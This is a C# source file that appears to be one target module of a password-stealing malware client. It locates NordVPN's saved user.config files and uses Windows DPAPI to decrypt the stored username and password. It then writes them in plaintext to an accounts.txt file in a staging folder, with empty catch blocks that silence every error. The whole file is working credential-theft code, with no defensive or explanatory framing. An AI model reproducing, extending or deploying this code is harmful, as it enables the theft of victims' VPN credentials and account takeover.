using System;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Xml;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.VPN;

internal sealed class NordVPN
{
	private static string Decode(string s)
	{
		try
		{
			return Encoding.UTF8.GetString(ProtectedData.Unprotect(Convert.FromBase64String(s), (byte[])null, (DataProtectionScope)1));
		}
		catch
		{
			return "";
		}
	}

	public static void Save(string sSavePath)
	{
		DirectoryInfo directoryInfo = new DirectoryInfo(Path.Combine(Paths.lappdata, "NordVPN"));
		if (!directoryInfo.Exists)
		{
			return;
		}
		try
		{
			Directory.CreateDirectory(sSavePath);
			DirectoryInfo[] directories = directoryInfo.GetDirectories("NordVpn.exe*");
			for (int i = 0; i < directories.Length; i++)
			{
				DirectoryInfo[] directories2 = directories[i].GetDirectories();
				foreach (DirectoryInfo directoryInfo2 in directories2)
				{
					string text = Path.Combine(directoryInfo2.FullName, "user.config");
					if (File.Exists(text))
					{
						Directory.CreateDirectory(sSavePath + "\\" + directoryInfo2.Name);
						XmlDocument xmlDocument = new XmlDocument();
						xmlDocument.Load(text);
						string innerText = xmlDocument.SelectSingleNode("//setting[@name='Username']/value")!.InnerText;
						string innerText2 = xmlDocument.SelectSingleNode("//setting[@name='Password']/value")!.InnerText;
						if (innerText != null && !string.IsNullOrEmpty(innerText) && innerText2 != null && !string.IsNullOrEmpty(innerText2))
						{
							string text2 = Decode(innerText);
							string text3 = Decode(innerText2);
							Counter.VPN++;
							File.AppendAllText(sSavePath + "\\" + directoryInfo2.Name + "\\accounts.txt", "Username: " + text2 + "\nPassword: " + text3 + "\n\n");
						}
					}
				}
			}
		}
		catch
		{
		}
	}
}
